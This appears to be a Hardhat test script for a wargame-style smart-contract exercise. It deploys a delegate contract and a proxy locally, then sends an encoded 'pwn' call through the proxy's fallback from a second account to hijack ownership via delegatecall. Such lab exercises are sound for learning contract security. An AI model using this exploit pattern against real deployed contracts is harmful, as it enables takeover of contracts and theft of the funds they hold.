import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/dist/src/signer-with-address";
import { ethers } from "hardhat";
import { DelegateBis } from "../typechain/DelegateBis";
import { DelegationBis } from "../typechain/DelegationBis";


describe("Delegation", function () {
  it("Should update owner", async function () {
    const [owner, addr1]: SignerWithAddress[] = await ethers.getSigners();
    const DelegationBisFactory = await ethers.getContractFactory("DelegationBis");
    const DelegateBisFactory = await ethers.getContractFactory("DelegateBis");
    const delegateInstance: DelegateBis = await DelegateBisFactory.deploy(owner.address);
    await delegateInstance.deployed();
    const delegationInstance: DelegationBis = await DelegationBisFactory.deploy(delegateInstance.address);
    await delegationInstance.deployed();

    const pwnData = delegateInstance.interface.encodeFunctionData("pwn");
    console.log(pwnData)

    console.log(await delegateInstance.owner())
    console.log(await delegationInstance.owner())
    console.log(await delegateInstance.address)
    console.log(await delegationInstance.address)
    console.log(owner.address)
    console.log(addr1.address)
    await delegationInstance.connect(addr1).fallback({ data: pwnData });
    // await delegateInstance.pwn();
    console.log(await delegateInstance.owner())
    console.log(await delegationInstance.owner())
  });
});
